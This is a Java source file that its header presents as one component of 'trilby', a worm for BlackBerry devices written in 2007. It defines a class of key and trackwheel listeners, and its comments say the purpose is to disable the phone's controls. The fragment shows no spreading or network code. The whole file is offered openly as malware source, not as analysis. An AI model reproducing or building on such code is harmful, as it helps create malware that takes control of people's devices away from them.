/*
 * fux0r.java - "I-Worm/BlackBerry.trilby"
 * by Dorian Warboys / Red Skål
 * https://github.com/redskal/
 *
 * Coded in 2007.
 *
 * This is part of the trilby worm for the BlackBerry.
 * This holds our listeners which disable the BB controls.
 */

package trilby.fux0r;

import net.rim.device.api.i18n.*;
import net.rim.device.api.system.*;
import net.rim.device.api.ui.container.*;
import net.rim.device.api.ui.*;
import net.rim.device.api.ui.component.*;

// here we disable all of the controls
public abstract class fux0r extends UiApplication implements KeyListener, TrackwheelListener {
    
    public boolean trackwheelClick(int status, int time) {
        return false;
    }
    
    public boolean trackwheelUnclick(int status, int time) {
        return false;
    }
    
    public boolean trackwheelRoll(int amount, int status, int time) {
        return false;
    }
    
    public boolean keyChar(char key, int status, int time) {
        switch(key) {
            default:
                break;
        }
        return false;
    }
    
    public boolean keyDown(int keycode, int time) {
        return false;
    }
    
     public boolean keyUp(int keycode, int time) {
         return false;
    }
    
    public boolean keyRepeat(int keycode, int time) {
        return false;
    }
    
    public boolean keyStatus(int keycode, int time) {
        return false;
    }
}
